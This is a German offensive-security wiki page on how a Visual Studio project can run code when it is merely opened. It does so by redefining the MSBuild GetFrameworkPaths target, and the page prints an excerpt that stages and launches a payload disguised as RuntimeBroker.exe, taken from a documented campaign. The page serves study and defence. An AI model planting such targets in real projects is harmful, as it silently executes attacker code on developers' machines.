# Design-Time-MSBuild-Ausführung in Visual-Studio-Projekten

{{#include ../banners/hacktricks-training.md}}

Das Öffnen eines C#-Projekts in Visual Studio ist kein passives Lesen. Sein Design-Time-Build ruft benannte MSBuild-Targets auf, um IntelliSense, Referenzen und Debugging zu initialisieren, **bevor** der Entwickler Build oder Run auswählt. `GetFrameworkPaths` ist eines dieser Targets. Ein Projekt, das es neu definiert, kann das Laden des Projekts ohne separaten Payload-Klick in eine Codeausführung im Benutzerkontext verwandeln.<sup>[[1]](#references)[[2]](#references)</sup>

Das beschriebene Projekt deklarierte Ressourcendateien und verwendete anschließend `MakeDir`, `Copy` und `Exec` innerhalb des ersetzten Targets, um einen nebenliegenden Payload bereitzustellen und zu starten. Dieser gekürzte Auszug zeigt den Ausführungspfad aus Abbildung 6 der Quelle; er gehört in eine `.csproj`-Datei, nicht in eine eigenständige XML-Datei.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Die Importreihenfolge ist wichtig:** MSBuild verwendet die *letzte* Definition eines Targets. Es ist nicht garantiert, dass ein in einer Projektdatei geschriebenes Target das Microsoft-Target ersetzt, wenn ein späterer Import es neu definiert. SDK-style-Projekte mit `<Project Sdk="...">` importieren SDK-Targets implizit nach dem Projektinhalt. Prüfe daher die ausgewertete Importreihenfolge, statt anzunehmen, dass diese genaue Überschreibung in jedem Projekt funktioniert. `MSBuild.exe -preprocess:expanded.xml project.csproj` erweitert Imports, ohne das Projekt zu erstellen, und kann helfen, die effektive Target-Definition zu finden.<sup>[[3]](#references)[[4]](#references)</sup>

Dies ist eine Ausführungsfläche für Entwicklerprojekte, keine Installation einer VSIX-Erweiterung und für sich genommen keine Rechteausweitung. Wenn die bereitgestellte ausführbare Datei eine bösartige benachbarte `.exe.config`- oder DLL-Datei verwendet, fahre mit [AppDomainManager-Hijacking und DLL-Sideloading](windows-local-privilege-escalation/dll-hijacking/) fort.

## References

- [1] [Unit 42 - Blinder-Tunnel-Kampagne zielt auf irakische Infrastruktur](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Visual-Studio-Integration (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild-Targets](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - MSBuild-Befehlszeilenreferenz](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
